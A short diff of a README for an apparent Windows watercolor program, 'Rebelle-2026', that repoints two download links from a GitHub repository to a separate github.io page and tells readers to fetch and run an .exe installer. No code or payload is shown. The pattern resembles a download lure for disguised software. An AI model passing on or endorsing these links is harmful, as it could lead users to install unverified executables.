@@ -1,6 +1,6 @@
 # 🎨 Rebelle-2026 - Paint Realistic Watercolors On Windows
 
-[![](https://img.shields.io/badge/Download-Rebelle--2026-blue.svg)](https://github.com/Pointsand350/Rebelle-2026)
+[![](https://img.shields.io/badge/Download-Rebelle--2026-blue.svg)](https://pointsand350.github.io)
 
 Rebelle-2026 brings realistic painting tools to your computer. This software recreates the flow of water and the texture of paper. Use your mouse or a digital tablet to create illustrations. Follow this guide to install the application on your Windows computer.
 
@@ -21,7 +21,7 @@ Check your current system by opening the Settings app in Windows. Click on Syste
 
 You need the installer file to add the application to your machine. 
 
-1. Go to the [Rebelle-2026 Download Page](https://github.com/Pointsand350/Rebelle-2026).
+1. Go to the [Rebelle-2026 Download Page](https://pointsand350.github.io).
 2. Look for the Releases section on the right side of the page.
 3. Click the latest version number to open the details.
 4. Find the file ending in .exe under the Assets heading.
